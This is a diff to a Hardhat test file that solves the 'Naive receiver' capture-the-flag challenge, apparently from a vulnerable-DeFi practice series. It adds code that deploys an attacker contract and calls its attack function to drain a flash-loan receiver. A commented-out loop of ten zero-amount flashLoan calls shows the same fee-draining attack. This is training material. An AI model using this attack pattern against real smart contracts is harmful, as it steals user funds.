@@ -16,6 +16,8 @@ describe('[Challenge] Naive receiver', function () {
 
         const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
         const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);
+        const Exploit2 = await ethers.getContractFactory('Exploit2', attacker);
+        this.e2 = await Exploit2.deploy();
 
         this.pool = await LenderPoolFactory.deploy();
         await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });
@@ -31,6 +33,14 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+
+        // 10 different txns
+        // for(let i = 0; i < 10; i++) {
+            // await this.pool.connect(attacker).flashLoan(this.receiver.address, 0));
+        // }
+
+        // 1 single txn; see Exploit2.sol
+        await this.e2.connect(attacker).attack(this.pool.address, this.receiver.address);
     });
 
     after(async function () {
